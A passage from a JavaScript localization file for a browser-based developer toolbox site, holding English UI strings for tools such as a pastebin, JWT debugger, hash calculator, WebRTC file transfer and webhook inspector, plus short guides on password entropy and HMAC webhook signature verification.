      'about_modal_body': '<p><strong>825412.xyz</strong> is an open-access developer and geek productivity toolbox.</p><p>We adhere to "Minimalist, Cyberpunk, Secure, and High-Performance" principles with zero login walls or paywalls. All tools run 100% in-browser with neon dark mode aesthetics.</p><h3>Core Suites:</h3><ul><li><strong>Dashboard:</strong> Real-time network node monitoring, latency ping, and global tools.</li><li><strong>Anonymous Clipboard:</strong> Ephemeral code sharing with auto-destruction timers.</li><li><strong>Geek Toolbox:</strong> Password generator, Unix timestamp, Base64, JSON and cryptographic hashing.</li><li><strong>AI Neural Assistant:</strong> Secure, private Gemini AI inference link.</li></ul>',
      'about_dismiss': 'Close',
      'contact_modal_title': 'Contact Us',
      'contact_modal_body': '<p>Thank you for using 825412.xyz! We value your feedback and bug reports.</p><p>If you encounter bugs, feature requests, or partnership inquiries, reach out anytime:</p><div class="alert-box" style="margin-top: 16px;"><span class="material-symbols-outlined" style="vertical-align: middle;">mail</span> Admin Email: <code>leen8254@gmail.com</code></div><p>We typically reply within 24 to 48 business hours.</p>',
      'contact_dismiss': 'Confirm',
      'terms_modal_title': 'Terms of Service',
      'terms_modal_body': '<p><strong>Effective Date: June 5, 2026</strong></p><p>Welcome to <strong>825412.xyz</strong>. By accessing or using our developer tools, you agree to these Terms of Service.</p><h3>1. Acceptance of Terms</h3><p>By visiting or utilizing our clipboard, hash calculator, time converter, or AI tools, you unconditionally accept this agreement and our Privacy Policy.</p><h3>2. Acceptable Use</h3><p>You agree to use these tools for lawful purposes only:</p><ul><li><strong>No Malicious Content:</strong> Transmitting malware, viruses, stolen credentials, or illegal content is strictly forbidden.</li><li><strong>Network Integrity:</strong> Automated DDoS attacks, brute-force spamming, or abuse is prohibited.</li><li><strong>Data Auto-Destruction:</strong> Ephemeral pastes self-destruct; please keep your own backups.</li></ul><h3>3. Disclaimer of Warranties</h3><ul><li>All utilities are provided "AS IS" without warranties of any kind.</li><li>Users bear sole responsibility for generated passwords, tokens, and AI responses.</li></ul><h3>4. Third-Party Advertisements</h3><p>We display third-party advertisements via Google AdSense. We do not endorse or assume liability for third-party products.</p><h3>5. Modifications</h3><p>We reserve the right to modify these terms at any time.</p>',
      'terms_dismiss': 'I have read and agree',
      'media_opt_webp': 'WebP (Recommended - Ultra High Compression)',
      'media_opt_jpeg': 'JPEG / JPG (High Compatibility)',
      'media_opt_png': 'PNG (Lossless / Transparent)',
      'media_opt_favicon': 'Favicon Icon (.ico 32x32)',
      'media_max_width_ph': 'e.g. 1920 (Optional)',
      'ai_model_flash': 'Gemini 2.5 Flash (Recommended)',
      'ai_model_pro': 'Gemini 2.5 Pro (Deep Reasoning)',
      'ai_model_lite': 'Gemini 2.5 Flash Lite (Fast)',
      'airdrop_peer_count': '1 Device Online',
      'webhook_count_badge': '0 Requests',
      'webhook_opt_post': 'POST (Default JSON)',

      // Navigation
      'nav_dashboard': 'Dashboard',
      'nav_clipboard': 'Pastebin',
      'nav_toolbox': 'Geek Toolbox',
      'nav_ai': 'AI Assistant',
      'nav_airdrop': 'Geek AirDrop',
      'nav_webhook': 'Webhook Inspector',
      'nav_settings': 'Settings',
      'nav_about': 'About Us',
      'nav_privacy': 'Privacy Policy',
      'nav_terms': 'Terms of Service',
      'nav_contact': 'Contact Us',

      // Dashboard
      'dash_title': 'Dashboard',
      'dash_subtitle': 'Real-time telemetry, node latency metrics, and instant tool access.',
      'dash_node_title': 'System & Node Telemetry',
      'dash_visitor_ip': 'Visitor IP',
      'dash_location': 'Connection Region',
      'dash_ping': 'Round-Trip Latency (Ping)',
      'dash_ai_title': 'AI Neural Link',
      'dash_ai_nokey': 'No API Key configured. Please enter your key in Settings to activate AI conversation.',
      'dash_ai_ready': '<span style="color: var(--color-tertiary); font-weight: 600;">Neural Link Online.</span> Connected to Gemini API Core.',
      'dash_ai_btn': 'Open Chat',
      'dash_toolbox_title': 'Quick Toolbox',
      'dash_shortcut_pwd': 'Password Generator',
      'dash_shortcut_time': 'Time Converter',
      'dash_shortcut_text': 'Text Processor',
      'dash_no_pastes': 'No recent pastes created yet...',
      'dash_go_clip': 'Open Pastebin',
      'dash_go_airdrop': 'Open AirDrop',

      // Dashboard Knowledge Hub
      'dash_kb_title': 'Developer Knowledge Hub & Technical Guides',
      'dash_kb_sub': 'In-depth technical guides covering computer networks, modern cryptography, WebRTC P2P mesh, and API architecture.',
      'dash_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">lan</span> WebRTC P2P LAN Direct Architecture</h3><p>Legacy file sharing tools (cloud drives, messaging file helpers) force files through third-party servers, causing <strong>slow transfers, file size caps, and privacy leaks</strong>.</p><p>Our <strong>WebRTC (Web Real-Time Communication)</strong> engine negotiates NAT addresses via STUN signaling, establishing an encrypted SCTP over DTLS tunnel directly between devices:</p><ul><li><strong>Zero Cloud Storage</strong>: Files stream strictly between device memories. No server intermediary can intercept.</li><li><strong>Gigabit LAN Speed</strong>: Bypasses public internet bottlenecks on local WiFi, achieving full physical network throughput.</li></ul>',
      'dash_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> Modern Cryptography & Password Entropy Standards</h3><p>Evaluating password security relies on information entropy rather than simple rules, governed by <strong>NIST SP 800-63B</strong> digital identity guidelines.</p><p>Entropy formula: <code>E = L × log2(R)</code>, where <code>L</code> is length and <code>R</code> is character pool size:</p><ul><li><strong>Below 40 Bits</strong>: Extremely weak, cracked in seconds via GPU rainbow tables.</li><li><strong>60 ~ 80 Bits</strong>: Moderate strength, defends against standard dictionary attacks.</li><li><strong>100+ Bits</strong>: Military grade, requires millions of years to brute-force on modern supercomputers.</li></ul>',
      'dash_card3_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">webhook</span> Webhook Event-Driven Architecture Best Practices</h3><p>In microservices and distributed systems, <strong>Webhooks (reverse HTTP callbacks)</strong> eliminate over 95% of wasted polling traffic and server CPU overhead.</p><p>High-availability Webhook consumers must enforce these core engineering rules:</p><ul><li><strong>Signature Verification</strong>: Validate <code>HMAC-SHA256</code> signatures to prevent request spoofing.</li><li><strong>Idempotency</strong>: Enforce deduplication via unique <code>event_id</code> keys against network retries.</li><li><strong>Asynchronous Decoupling</strong>: Respond with <code>200 OK</code> within 500ms and offload processing to queues (Kafka/RabbitMQ).</li></ul>',
      'dash_table_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">table_chart</span> Developer Network Protocols & Cryptography Cheatsheet</h3><div class="doc-table-wrapper"><table class="doc-table"><thead><tr><th>Category</th><th>Protocol / Standard</th><th>Port / Width</th><th>Typical Use Cases</th><th>Security Level</th></tr></thead><tbody><tr><td><strong>Transport</strong></td><td>HTTPS / TLS 1.3</td><td>443 (TCP)</td><td>Web end-to-end encrypted transport, REST API gateways</td><td><span style="color: #10b981; font-weight: 700;">Very High (Industry Standard)</span></td></tr><tr><td><strong>Real-Time</strong></td><td>WebRTC DataChannel</td><td>Dynamic UDP (STUN 3478)</td><td>Browser P2P direct file drop, low-latency audio/video</td><td><span style="color: #10b981; font-weight: 700;">Very High (DTLS Encrypted)</span></td></tr><tr><td><strong>Hashing</strong></td><td>SHA-256</td><td>256 Bits (32 Bytes)</td><td>Blockchain, SSL certificates, Webhook HMAC signatures</td><td><span style="color: #10b981; font-weight: 700;">Very High (Collision Resistant)</span></td></tr><tr><td><strong>Hashing</strong></td><td>MD5</td><td>128 Bits (16 Bytes)</td><td>Legacy checksums, file deduplication hashing</td><td><span style="color: #ef4444; font-weight: 700;">Low (Collisions Feasible)</span></td></tr><tr><td><strong>Auth Tokens</strong></td><td>JWT (JSON Web Token)</td><td>RFC 7519</td><td>Stateless cross-domain authentication, OAuth 2.0</td><td><span style="color: #06b6d4; font-weight: 700;">High (Strong Secret Req.)</span></td></tr></tbody></table></div>',

      // Pastebin
      'clip_title': 'Anonymous Pastebin',
      'clip_subtitle': 'Fast, zero-login temporary text & code sharing with auto-expiration.',
      'clip_ph': '// Paste your code snippet or notes here...',
      'clip_1h': 'Expires in 1 Hour',
      'clip_24h': 'Expires in 24 Hours',
      'clip_7d': 'Expires in 7 Days',
      'clip_btn_create': 'Generate Share Link',
      'clip_share_result': 'Share Result',
      'clip_share_url_label': 'Your Share Link (Click to copy):',
      'clip_local_history': 'Local History',
      'clip_copy_link': 'Copy Link',
      'clip_direct_link': 'Direct Link:',
      'clip_open_link': 'Open Link in New Tab',
      'clip_recent_title': 'Recent Shared Pastes (Local History)',
      'clip_clear_history': 'Clear History',
      'clip_history_empty': 'No paste history in local storage.',
      'clip_faq_title': 'Pastebin Security & Architecture Guide',
      'clip_faq_q1': 'How does the anonymous pastebin work?',
      'clip_faq_a1': 'Paste any code or text, choose an expiration duration, and click Create Share Link. The system generates a unique hash link (#paste=xxxx). Anyone opening the link can view and copy the content with zero registration.',
      'clip_faq_q2': 'Data encryption and self-destruction model',
      'clip_faq_a2': 'We support 1-hour, 24-hour, and 7-day auto-destruction. Once expired, data is permanently purged. We collect no PII or credentials, ensuring complete anonymity.',

      // Toolbox
      'tool_title': 'Geek Developer Toolbox',
      'tool_subtitle': 'Zero-installation, client-side, privacy-focused online developer suite.',
      'tool_pwd_tab': 'Password Gen',
      'tool_json_tab': 'JSON Formatter',
      'tool_jwt_tab': 'JWT Debugger',
      'tool_hash_tab': 'Hash Calculator',
      'tool_time_tab': 'Time Converter',
      'tool_text_tab': 'Text Utilities',
      'tool_net_tab': 'Network & Privacy',
      'tool_media_tab': 'Media & Images',

      // Password Generator
      'tool_pwd_gen': 'Click Generate Button Below',
      'pwd_strength_title': 'Security Grade:',
      'pwd_crack_time_label': 'Brute-Force Estimate (RTX 4090):',
      'pwd_charset_size_label': 'Available Charset Pool (N):',
      'pwd_rec_label': 'Compliance Suggestion:',
      'tool_pwd_len': 'Password Length:',
      'tool_pwd_upper': 'Uppercase (A-Z)',
      'tool_pwd_lower': 'Lowercase (a-z)',
      'tool_pwd_num': 'Numbers (0-9)',
      'tool_pwd_sym': 'Special Symbols (!@#$...)',
      'tool_pwd_btn': 'Generate Secure Password',

      // JSON Formatter
      'json_btn_format_2': 'Format (2 Spaces)',
      'json_btn_format_4': 'Format (4 Spaces)',
      'json_btn_minify': 'Minify JSON',
      'json_btn_copy': 'Copy JSON',
      'json_ph': 'Paste raw JSON string here to format or validate...',
      'json_status_ready': 'JSON parser ready. Real-time AST syntax validation active.',

      // JWT Debugger
      'jwt_input_label': 'Encoded Token (Raw JWT):',
      'jwt_btn_sample': 'Load Sample',
      'jwt_ph': 'Paste eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... here',
      'jwt_valid_text': 'Client-side offline parsing: No token is ever transmitted to any remote server.',
      'jwt_header_title': 'HEADER: ALGORITHM & TOKEN TYPE',
      'jwt_payload_title': 'PAYLOAD: DATA CLAIMS',

      // Hash Calculator
      'hash_ph': 'Enter any string to calculate cryptographic hashes in real time...',
      'hash_mode_text': 'Text String Hash',
      'hash_mode_file': 'File / Binary Checksum',
      'hash_uppercase_label': 'Uppercase (A-F)',
      'hash_drop_hint': 'Drag & drop file here or click to choose',
      'hash_drop_sub': '100% Client-side local computing, never uploaded to any server (Supports ISO, Zip, Exe, Firmware)',
      'hash_verify_title': 'Checksum Integrity Matcher',
      'hash_verify_ph': 'Paste official MD5 / SHA-256 checksum to auto-verify file integrity...',
      'hash_verify_match_md5': '✅ Checksum Verified! Matches MD5',
      'hash_verify_match_sha1': '✅ Checksum Verified! Matches SHA-1',
      'hash_verify_match_sha256': '✅ Checksum Verified! Matches SHA-256 (Recommended)',
      'hash_verify_match_sha512': '✅ Checksum Verified! Matches SHA-512',
      'hash_verify_mismatch': '⚠️ Mismatch (File may be modified or corrupted)',

      // Time Converter
      'tool_time_curr': 'Current Local Time',
      'tool_time_copy_sec': 'Copy Seconds',
      'tool_time_conv_title': 'Timestamp Converter',
      'tool_time_conv_label': 'Timestamp (sec) -> Date & Time',
      'tool_time_conv_btn': 'Convert',
      'time_code_cheatsheet': 'Current Timestamp Quick Snippets Across Languages:',
      'time_current_label': 'Current Timestamp:',
      'time_btn_copy': 'Copy',
      'time_btn_refresh': 'Refresh',
      'time_ts2date_title': 'Timestamp ➡️ Date String',
      'time_ts_input_label': 'Timestamp (sec / ms):',
      'time_btn_convert': 'Convert to Date',
      'time_date2ts_title': 'Date String ➡️ Timestamp',
      'time_date_input_label': 'Date & Time:',
      'time_btn_to_ts': 'Convert to Timestamp',

      // Text Utilities
      'tool_text_ph': 'Type or paste text you want to process...',
      'tool_text_upper': 'UPPERCASE',
      'tool_text_lower': 'lowercase',
      'tool_text_count': 'Word & Char Count',
      'tool_text_b64enc': 'Base64 Encode',
      'tool_text_b64dec': 'Base64 Decode',
      'tool_text_urlenc': 'URL Encode',
      'tool_text_urldec': 'URL Decode',
      'tool_text_clear': 'Clear',
      'tool_text_res_label': 'Result:',

      // Network & Privacy Suite
      'net_ip_title': 'My Public IP & Geo Network Diagnostics',
      'net_ip_loading': 'Detecting public IP & network node...',
      'net_ip_refresh': 'Refresh Diagnostics',
      'net_ip_label': 'Public IPv4 / IPv6:',
      'net_geo_label': 'Geo Location / ISP:',
      'net_webrtc_title': 'WebRTC Local IP Leak Detection',
      'net_webrtc_desc': 'Detects whether browser WebRTC punches through and leaks your real private/public IP when using VPN or proxy.',
      'net_webrtc_detecting': 'Probing WebRTC ICE Candidates...',
      'net_webrtc_safe': '🛡️ Safe: No WebRTC leak detected',
      'net_webrtc_leak': '⚠️ Warning: WebRTC leaked real IP: ',
      'net_ping_title': 'Global Backbone CDN Latency Test (Ping)',
      'net_ping_btn': 'Start Latency Test',
      'wifi_qr_title': 'WiFi QR Code Direct-Connect Generator',
      'wifi_qr_sub': 'Generate standard WiFi QR code. Scan with mobile camera to connect instantly without typing password.',
      'wifi_ssid_label': 'WiFi Name (SSID):',
      'wifi_ssid_ph': 'e.g. MyOffice_5G / Home_WiFi',
      'wifi_pwd_label': 'WiFi Password:',
      'wifi_pwd_ph': 'Enter wireless password (leave empty if none)',
      'wifi_auto_hint_nopass': 'Auto-detected: Open Network (No password required)',
      'wifi_adv_options': 'Advanced Settings (Optional: manual encryption / hidden SSID)',
      'wifi_enc_auto': '⚡ Smart Auto (Recommended)',
      'wifi_enc_label': 'Encryption:',
      'wifi_hidden_label': 'Hidden Network (Hidden SSID)',
      'wifi_gen_btn': 'Generate WiFi QR',
      'wifi_dl_btn': 'Download QR Image',
      'wifi_copy_str_btn': 'Copy Connect String',

      // Media & Images Suite
      'media_compress_title': 'Client-Side Image Compressor & Converter',
      'media_compress_sub': '100% in-browser memory compression, never uploaded to any server, zero privacy risk.',
      'media_drop_hint': 'Drag & drop image here or click to choose',
      'media_drop_sub': 'Supports PNG, JPG, WebP, BMP (Instant local processing)',
      'media_quality_label': 'Compression Quality:',
      'media_format_label': 'Output Format:',
      'media_max_width_label': 'Max Width Limit (px, empty for original):',
      'media_compress_btn': 'Compress & Convert',
      'media_download_btn': 'Download Processed Image',
      'media_stats_orig': 'Original Size:',
      'media_stats_comp': 'Compressed Size:',
      'media_stats_saved': 'Saved Ratio:',
      'media_exif_title': 'Photo EXIF & GPS Location Privacy Scrubber',
      'media_exif_sub': 'Photos contain exact GPS coordinates, timestamp, and device model. Strip all metadata for safe sharing.',
      'media_exif_clean_btn': 'Strip All EXIF Metadata & Export',
      'media_exif_no_gps': '✅ No sensitive GPS coordinates found in this image',
      'media_exif_found_gps': '⚠️ Sensitive GPS location & device data detected in photo:',

      // AirDrop
      'airdrop_title': 'Geek AirDrop (Web P2P File Drop)',
      'airdrop_subtitle': 'Zero-login, cross-device instant file, text, and clipboard transfer via WebRTC P2P.',
      'airdrop_my_device': 'My Device Identity:',
      'airdrop_room_label': 'Current Channel:',
      'airdrop_qr_btn': 'Mobile Scan QR',
      'airdrop_qr_modal_title': 'Scan QR Code to Connect Mobile',
      'airdrop_qr_room_label': 'Room Code:',
      'airdrop_qr_modal_tip': 'Scan with your mobile camera or browser to instantly join this room without installing any app!',
      'airdrop_copy_invite': 'Copy Direct Link',
      'airdrop_join_btn': 'Switch Channel',
      'airdrop_send_title': '📤 Transfer Files & Text',
      'airdrop_peers_title': 'Connected Peers in Channel',
      'airdrop_rescan_btn': 'Refresh Peers',
      'airdrop_drop_hint': 'Drop files here or click to select',
      'airdrop_drop_sub': 'Supports images, zips, code, docs (Max 50MB)',
      'airdrop_text_ph': 'Type text or code to instantly transfer across devices...',
      'airdrop_send_text_btn': 'Send Text to Peers',
      'airdrop_recv_title': '📥 Real-Time Incoming Stream',

      // AirDrop Whitepaper
      'airdrop_doc_title': 'WebRTC Geek AirDrop Technical Principles & Security Whitepaper',
      'airdrop_doc_sub': 'Learn how peer-to-peer communication, STUN NAT traversal, and zero-cloud-log architecture work.',
      'airdrop_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">sync_alt</span> 1. WebRTC P2P Direct Mesh Handshake Lifecycle</h3><p><strong>Geek AirDrop</strong> is built natively upon the browser\'s <code>RTCPeerConnection</code> and <code>RTCDataChannel</code> APIs, operating completely free from centralized server relays:</p><ol><li><strong>Signaling Phase</strong>: When peers join the same channel room, public STUN servers resolve their respective public/private ICE Candidate network endpoints.</li><li><strong>SDP Exchange & NAT Traversal</strong>: Devices exchange SDP Offer/Answer handshakes to punch through NAT routers and establish direct bilateral UDP encrypted tunnels.</li><li><strong>SCTP Chunk Streaming</strong>: Large files are partitioned into 64KB binary <code>ArrayBuffer</code> slices, streaming directly across browser memories at full hardware wire speeds.</li></ol>',
      'airdrop_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> 2. Why Is It More Secure Than Cloud Messengers?</h3><p>For engineering teams handling confidential source code, tokens, or private documents, cloud file helpers present major compliance liabilities:</p><ul><li><strong>Zero Cloud Intermediation</strong>: We operate no central file servers. Your payload <strong>never touches any third-party disk</strong>, freeing memory immediately upon transfer.</li><li><strong>DTLS Military-Grade Encryption</strong>: All DataChannel streams are encrypted with DTLS (Datagram Transport Layer Security) at 128/256-bit strength, preventing LAN sniffing.</li><li><strong>Universal Cross-Platform</strong>: Zero installation or plugins required. Seamlessly connect Windows, macOS, Linux, iOS, and Android in seconds.</li></ul>',
      'airdrop_faq_title': 'Frequently Asked Questions & Troubleshooting (FAQ)',
      'airdrop_faq_q1': 'Do both devices need to be on the same WiFi network?',
      'airdrop_faq_a1': 'No! As long as both devices have internet connectivity, WebRTC performs STUN NAT traversal to establish a direct P2P tunnel. When on the same WiFi, traffic flows over local LAN with gigabit speeds!',
      'airdrop_faq_q2': 'Why is there a slight delay when a peer disconnects?',
      'airdrop_faq_a2': 'When a tab is closed, a bye beacon is broadcasted instantly for 0ms teardown. If a mobile device goes to sleep or disconnects abruptly, our 1.5s heartbeat timer cleans up dead connections within 3.5 seconds. You can also click Refresh Peers at any time.',
      'airdrop_faq_q3': 'Is there a file size limit?',
      'airdrop_faq_a3': 'We recommend files under 50MB. Because WebRTC DataChannel streams in memory chunks, very large files may strain low-memory mobile browsers. Source code, documents, photos, and zip archives transfer effortlessly.',

      // Webhook Inspector
      'webhook_title': 'Webhook Inspector & API Echo Testbed',
      'webhook_subtitle': 'Generate a dedicated public HTTP callback endpoint to capture, format, and inspect live Webhook payloads (GitHub, Stripe, WeChat Pay, etc.).',
      'webhook_endpoint_label': 'Your Dedicated Webhook Endpoint (URL):',
      'webhook_btn_copy_url': 'Copy URL',
      'webhook_btn_copy_curl': 'Copy cURL Command',
      'webhook_curl_hint': 'Terminal one-click test request snippet:',
      'webhook_mock_title': '🧪 Send Mock Webhook',
      'webhook_method_label': 'HTTP Method',
      'webhook_body_label': 'Payload (JSON Body)',
      'webhook_btn_send_mock': 'Send Mock Request',
      'webhook_logs_title': '📡 Captured Request Payloads',
      'webhook_empty_hint': 'Listening on endpoint... Send HTTP requests to inspect Headers and Body payloads in real time.',

      // Webhook Guide
      'webhook_doc_title': 'Webhook Architecture Design & Production Security Guide',
      'webhook_doc_sub': 'Master reverse HTTP callbacks, HMAC-SHA256 signature verification, anti-replay timestamps, and idempotency.',
      'webhook_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">compare_arrows</span> 1. Webhook vs Traditional HTTP Polling Comparison</h3><p>In traditional client-server architectures, polling state changes (e.g. payment confirmations or git commits) requires clients to query APIs every few seconds:</p><ul><li><strong>Polling Drawbacks</strong>: 99% of requests return "no changes", wasting significant server CPU, database connections, and bandwidth with noticeable latency.</li><li><strong>Webhook Advantages</strong>: Passive listening where the third-party server <strong>actively pushes a single HTTP POST request</strong> upon event occurrence, reducing latency to milliseconds and bandwidth by >90%.</li></ul>',
      'webhook_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">lock_clock</span> 2. Five Production Security Rules for Webhook Consumers</h3><p>Exposing public callback endpoints invites spoofing or replay attacks. Production systems must enforce these defenses:</p><ol><li><strong>Signature Verification (HMAC)</strong>: Compute <code>HMAC-SHA256</code> over the raw payload with a shared <code>Secret</code>, comparing against headers.</li><li><strong>Timestamp Anti-Replay</strong>: Verify request headers (e.g. <code>X-Client-Timestamp</code>), discarding any request older than 5 minutes.</li><li><strong>Idempotency Enforcement</strong>: Deduplicate using <code>order_id</code> or <code>event_id</code> via unique indexes to handle network retries safely.</li><li><strong>Rapid 200 OK & Async Offload</strong>: Return <code>200 OK</code> within 500ms and push heavy tasks to message queues (Kafka/Redis) asynchronously.</li></ol>',
      'webhook_card3_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">code</span> HMAC-SHA256 Signature Verification Code Snippets</h3><div style="margin-top: 12px;"><div style="font-size: 13px; font-weight: 700; color: #38bdf8; margin-bottom: 6px;">🐍 Python (FastAPI / Flask) Example:</div><pre class="code-snippet">import hmac, hashlib\n\ndef verify_webhook_signature(raw_body: bytes, signature_header: str, secret_key: str) -> bool:\n    expected_sig = "sha256=" + hmac.new(secret_key.encode(), raw_body, hashlib.sha256).hexdigest()\n    # Use hmac.compare_digest to prevent timing attacks\n    return hmac.compare_digest(expected_sig, signature_header)</pre></div><div style="margin-top: 14px;"><div style="font-size: 13px; font-weight: 700; color: #38bdf8; margin-bottom: 6px;">🟢 Node.js (Express) Example:</div><pre class="code-snippet">const crypto = require(\'crypto\');\n\nfunction verifyWebhook(rawPayload, signatureHeader, secret) {\n  const hmac = crypto.createHmac(\'sha256\', secret);\n  const digest = \'sha256=\' + hmac.update(rawPayload).digest(\'hex\');\n  return crypto.timingSafeEqual(Buffer.from(digest), Buffer.from(signatureHeader));\n}</pre></div>',

      // In-depth Knowledge Base
      'tool_doc_title': 'Geek Toolbox Tech Articles & Cryptography Knowledge Base',
      'tool_doc_sub': 'Covering modern password entropy models, JWT stateless auth architecture, one-way hash collision security, and time systems.',
      'tool_gpu_table_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">timer</span> Modern GPU Cluster (8x RTX 4090 Matrix) Brute-Force Cracking Time Matrix</h3><p style="margin-bottom: 12px;">Theoretical cracking times based on 8x NVIDIA RTX 4090 cluster (~100 Billion NTLM hashes/sec):</p><div class="doc-table-wrapper"><table class="doc-table"><thead><tr><th>Length</th><th>Numbers Only (10 chars)</th><th>Lowercase Only (26 chars)</th><th>Mixed Case (52 chars)</th><th>Alphanumeric + Symbols (94 chars)</th></tr></thead><tbody><tr><td><strong>6 Chars</strong></td><td><span style="color: #ef4444; font-weight:700;">Instant (0.001s)</span></td><td><span style="color: #ef4444; font-weight:700;">0.03s</span></td><td><span style="color: #ef4444; font-weight:700;">0.2s</span></td><td><span style="color: #f59e0b; font-weight:700;">7s</span></td></tr><tr><td><strong>8 Chars</strong></td><td><span style="color: #ef4444; font-weight:700;">0.01s</span></td><td><span style="color: #ef4444; font-weight:700;">2s</span></td><td><span style="color: #f59e0b; font-weight:700;">8 mins</span></td><td><span style="color: #f59e0b; font-weight:700;">7 hrs</span></td></tr><tr><td><strong>12 Chars</strong></td><td><span style="color: #ef4444; font-weight:700;">1s</span></td><td><span style="color: #f59e0b; font-weight:700;">3 weeks</span></td><td><span style="color: #10b981; font-weight:700;">200 yrs</span></td><td><span style="color: #10b981; font-weight:700;">34,000 yrs</span></td></tr><tr><td><strong>16 Chars (Rec.)</strong></td><td><span style="color: #f59e0b; font-weight:700;">3 hrs</span></td><td><span style="color: #10b981; font-weight:700;">45,000 yrs</span></td><td><span style="color: #10b981; font-weight:700;">1 Billion yrs</span></td><td><span style="color: #10b981; font-weight:700;">32 Quintillion yrs (Unbreakable)</span></td></tr></tbody></table></div><div class="doc-callout success"><strong>💡 NIST Golden Rule</strong>: Increasing password length scales security exponentially, far more effectively than adding complexity. Maintain a minimum length of <strong>16+ characters</strong>.</div>',
      'tool_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">lock</span> 1. Password Information Entropy (E = L × log2(N))</h3><p>Information entropy quantifies unpredictability via Shannon\'s information theory: <code>E = L × log2(N)</code>.</p><p>Where <code>L</code> is password length and <code>N</code> is available charset pool size (94 possible ASCII characters).</p><ul><li><strong>Below 40 Bits</strong>: Dangerously weak, cracked in seconds.</li><li><strong>60 ~ 80 Bits</strong>: Standard enterprise protection.</li><li><strong>90+ Bits</strong>: Military-grade brute-force resistance.</li></ul>',
      'tool_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">vpn_key</span> 2. JWT (RFC 7519) Core Architecture & Vulnerabilities</h3><p>JWT consists of <code>Header.Payload.Signature</code> as a stateless identity claim. Essential production defenses:</p><ul><li><strong>None Algorithm Attacks</strong>: Always reject tokens with <code>alg: "none"</code> to prevent forged admin sessions.</li><li><strong>Weak Secret Brute-Forcing</strong>: Never use dictionary words as HMAC secrets; always generate 256-bit random keys.</li><li><strong>XSS Protection</strong>: Store JWTs in <code>HttpOnly SameSite=Strict</code> cookies rather than <code>localStorage</code>.</li></ul>',
      'tool_card3_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">fingerprint</span> 3. Cryptographic Hashes (MD5 vs SHA-256 vs Argon2)</h3><p>Cryptographic hashes exhibit avalanche effect and one-way irreversibility. MD5 and SHA-1 suffer from collision flaws:</p><ul><li><strong>Data Integrity</strong>: Use <strong>SHA-256</strong> and <strong>SHA-512</strong>.</li><li><strong>Password Storage</strong>: Never use fast hashes; always use memory-hard, GPU-resistant slow hashes: <strong>Argon2id, bcrypt, or PBKDF2</strong> with dynamic salts.</li></ul>',
      'tool_card4_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">schedule</span> 4. Unix Epoch Timestamp & Year 2038 Problem (Y2K38)</h3><p>Unix time counts seconds elapsed since <code>1970-01-01 00:00:00 UTC</code>:</p><ul><li>Legacy <strong>32-bit signed integers</strong> reach maximum value at <code>2,147,483,647</code> seconds;</li><li>On <strong>Jan 19, 2038 at 03:14:07 UTC</strong>, 32-bit time wraps to 1901;</li><li>Modern 64-bit architectures completely resolve this, supporting time spans up to 292 billion years.</li></ul>',

      // AI Chat
      'ai_title': 'AI Assistant',
      'ai_subtitle': 'Deep real-time AI conversation powered by Gemini. Fully local & private.',
      'ai_model_label': 'AI Model:',
      'ai_welcome': 'Hello, Operator. I am the AI Assistant of 825412.xyz. Please configure your Gemini API Key in Settings to enable the AI link.',
      'ai_input_ph': 'Type your question and press Enter...',

      // Settings Modal
      'set_title': 'Settings Center',
      'set_alert': 'Security Note: API Keys are stored encrypted ONLY in your local browser LocalStorage and never sent to any 3rd party.',
      'set_key_label': 'Gemini API Key',
      'set_key_ph': 'Enter your Gemini API key',
      'set_cancel': 'Cancel',
      'set_save': 'Save Settings',

      // Read Paste Modal
      'read_modal_title': 'Received Shared Pastebin Content',
      'read_meta_label': 'Shared Content:',
      'read_copy_btn': 'Copy All',
      'read_close_btn': 'Close',

      // Terms of Service Modal
      'terms_modal_title': 'Terms of Service (ToS)',
      'terms_dismiss': 'I Have Read & Agree',

      // Cookie Consent Banner
      'cookie_text': 'We use cookies and local storage to provide developer tools, analyze traffic, and display personalized ads. By continuing, you agree to our Privacy Policy and Terms of Service.',
      'cookie_accept': 'Accept & Continue',
      'cookie_learn': 'Learn More',

      // Footer
      'footer_rights': '© 2026 825412.xyz Geek Toolbox | All Rights Reserved.'
    }
  },

  init() {
    this.currentLang = StorageController.getLanguage();
    this.renderLangSelectors();
    this.applyLanguage(this.currentLang);
  },

  renderLangSelectors() {
    const selectors = document.querySelectorAll('.lang-selector');
    selectors.forEach(select => {
      select.innerHTML = this.supportedLanguages.map(lang => {
        const selected = lang.code === this.currentLang ? 'selected' : '';
        return `<option value="${lang.code}" ${selected}>${lang.flag} ${lang.name}</option>`;
      }).join('');

      select.value = this.currentLang;

      select.onchange = (e) => {
        this.setLanguage(e.target.value);
      };
    });
  },

  toggleLanguage() {
    const nextLang = this.currentLang === 'zh-CN' ? 'en-US' : 'zh-CN';
    this.setLanguage(nextLang);
  },

  setLanguage(lang) {
    this.currentLang = lang;
    StorageController.saveLanguage(lang);
    this.renderLangSelectors();
    this.applyLanguage(lang);
  },

  t(key) {
    const dict = this.translations[this.currentLang] || this.translations['en-US'] || this.translations['zh-CN'];
    return dict[key] || (this.translations['en-US'] && this.translations['en-US'][key]) || key;
  },

  applyLanguage(lang) {
    // 智能兜底：未完全翻译的语种优先降级使用 en-US，再降级使用 zh-CN
    const dict = this.translations[lang] || this.translations['en-US'] || this.translations['zh-CN'];
    
    // 渲染带有 data-i18n 的 DOM 元素
    document.querySelectorAll('[data-i18n]').forEach(el => {
      const key = el.getAttribute('data-i18n');
      if (dict[key]) {
        el.innerHTML = dict[key];
      }
    });

    // 渲染带有 data-i18n-ph 的输入框 placeholder
    document.querySelectorAll('[data-i18n-ph]').forEach(el => {
      const key = el.getAttribute('data-i18n-ph');
      if (dict[key]) {
        el.placeholder = dict[key];
      }
    });

    // 更新切换按钮的文案
